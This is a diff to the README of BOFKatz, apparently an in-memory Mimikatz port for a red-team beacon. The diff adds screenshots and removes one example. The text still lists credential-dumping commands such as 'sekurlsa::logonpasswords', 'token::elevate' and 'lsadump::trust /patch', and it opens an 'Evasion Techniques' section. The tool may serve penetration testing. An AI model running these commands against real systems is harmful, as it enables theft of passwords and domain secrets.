@@ -18,21 +18,17 @@ A Beacon Object File (BOF) implementation of Mimikatz that executes in memory wi
 BOFKatz
 ```
 
+<img width="577" height="460" alt="imagen" src="https://github.com/user-attachments/assets/648b81ee-e2a0-4f95-8514-6eb26dff7b4e" />
+
 Executes with default `coffee` command and automatically exits.
-
-### Basic Mimikatz Commands
-
-```
-BOFKatz "privilege::debug" "sekurlsa::logonpasswords"
-```
-
-Runs privilege escalation and dumps logon passwords.
 
 ### Commands with Spaces
 
 ```
 BOFKatz coffee "lsadump::trust /patch"
 ```
+
+![Sin título](https://github.com/user-attachments/assets/744871d3-66a8-45b4-bbe0-19bcb1cde90c)
 
 Executes LSA dump trust command with patch argument (note the quotes for arguments containing spaces).
 
@@ -41,6 +37,9 @@ Executes LSA dump trust command with patch argument (note the quotes for argumen
 ```
 BOFKatz token::elevate privilege::debug sekurlsa::logonpasswords
 ```
+
+![Sin título-1](https://github.com/user-attachments/assets/3efff355-b9c5-46a1-9d46-9ffd568d5006)
+
 
 ## Evasion Techniques
 
